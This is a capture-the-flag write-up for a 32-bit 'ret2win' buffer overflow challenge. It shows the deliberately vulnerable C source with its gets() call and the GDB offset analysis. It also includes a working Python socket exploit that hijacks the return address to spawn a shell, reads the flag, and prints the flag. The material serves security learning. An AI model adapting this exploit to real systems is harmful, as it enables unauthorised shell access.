# Baby Buffer Overflow - 32bit ✅

## Challenge Description
> ![image](https://github.com/user-attachments/assets/4d48194c-d8f7-4766-8078-737f5ad03d9a)


## Approach
1. The challenge gives us a binary and some source code to analyze.   

![image](https://github.com/user-attachments/assets/a19b9ac8-9c70-4947-9d9e-4da63035dad0)


2. From the code, we can see that the vuln function contains a buffer overflow vulnerability. It reads data into a 16-byte buffer using gets(), which doesn’t check for overflow—perfect for exploiting! This type of challenge is called `ret2win` (return to win(), which is a typical function name for such challenges).

```C
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
     puts("Jackpot!");
     char* executable="/bin/bash";
     char* argv[]={executable, NULL};
     execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```
The goal is to overflow the buffer in vuln to overwrite the return address with the address of `target`. When vuln finishes, it will *return* to `target` instead of going back to `main`, executing the shell function in `target`.

2. Since this is a 32-bit binary, it relies on specific libraries:  

![image](https://github.com/user-attachments/assets/97d43191-7b3a-48e7-ad36-820fc3b40a1d)

To ensure it runs properly, I had to install the required 32-bit library:

```bash
sudo apt install musl:i386
```

3. Using IDA Pro, I found the address of the `target()`:

![image](https://github.com/user-attachments/assets/60b49796-2828-4831-9a33-921f641c6aca)

And the `vuln()` takes 24 characters. 

![image](https://github.com/user-attachments/assets/37331b01-a13a-4e0e-bf17-0fa3c3f12f70)

4. In a 32-bit architecture, whenever a buffer is overflown, the register eip gets loaded with the overwritten “saved return address” from stack. To exploit this vulnerability, we need to know the exact number of bytes to overflow the buffer and reach the return address. With a little debugging in GDB, I found that the offset is 28 bytes.

![image](https://github.com/user-attachments/assets/2fec7958-97fc-4a57-b96c-8a9b7d99971a)

5. Using the script below we can overflow and get to the `target`.

```python
import socket
import struct

# Address of the target function in little-endian format
target_addr = struct.pack('<I', 0x80491F5)  # Address of the target function

# Set the correct buffer size
buffer_size = 28  # Buffer size to reach the saved return address

# Craft the payload
payload = b'A' * buffer_size + target_addr

# Connect to the remote server
host = 'challenge.ctf.games'
port = 32336

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))

    # Receive the initial message from the server
    initial_message = s.recv(1024).decode()
    print("Initial Message:", initial_message)

    # Send the exploit payload
    s.send(payload + b'\n')
    print("Payload Sent:", payload)

    # Send the command to list files
    command = b'ls\n'  # List files
    s.send(command)
    print("Command Sent:", command)

    # Wait for the response after the ls command
    while True:
        try:
            data = s.recv(1024).decode()
            if data:
                print("Response:", data)
                if "flag" in data:  # If flag file is listed, read it
                    # Now send command to read the flag
                    read_flag_command = b'cat flag\n'
                    s.send(read_flag_command)
                    print("Command to read flag sent.")
            else:
                print("No more data received.")
                break
        except Exception as e:
            print("Error:", e)
            break

```

6. Running the script triggers the overflow, and we jump straight to `target()`. The shell opens up, and we can easily grab the flag. 

![image](https://github.com/user-attachments/assets/4cef3cbc-f686-4dce-b048-9f65be320e85)

## Flag
flag{4cd3b4079393e861af489ca063373f98}




   



